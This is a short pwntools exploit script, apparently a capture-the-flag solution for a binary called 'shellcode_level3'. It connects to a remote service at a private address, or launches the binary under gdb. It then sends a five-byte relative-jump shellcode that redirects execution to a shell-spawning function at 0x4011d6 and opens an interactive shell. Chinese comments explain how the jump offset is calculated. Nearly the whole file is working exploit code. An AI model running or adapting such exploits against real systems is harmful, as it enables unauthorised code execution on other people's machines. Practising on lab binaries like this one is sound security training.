from pwn import * 
from pwn import p64,u64
# # from LibcSearcher import *

debug = 0
gdb_is = 1
# context(arch='i386',os = 'linux')
context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    if not gdb_is:
        r = process("./shellcode_level3")
    
else:
    host = "192.168.0.111:42900"
    r = connect(host.split(':')[0],host.split(':')[1])#远程连接
    gdb_is =0

if gdb_is:
    r = gdb.debug("./shellcode_level3",'b *0x401265')
    pause()
    pass
shelladdr = 0x04011D6

# # call指令的下条指令的地址是0040100D+ 相对地址 这里是01000000，由于是little end 反过来就是00000001 
# # 跳转或者call的绝对地址=call指令或跳转指令的下一条指令的地址+ 相对地址(翻转)



# 0x40408e->0x4011d6 is -0x2eb8 bytes
# 补码 0xD148
shellcode = b'\xE9\x48\xD1\xff\xff'
print(shellcode)
print(size(shellcode))
r.sendline(shellcode)
r.interactive()
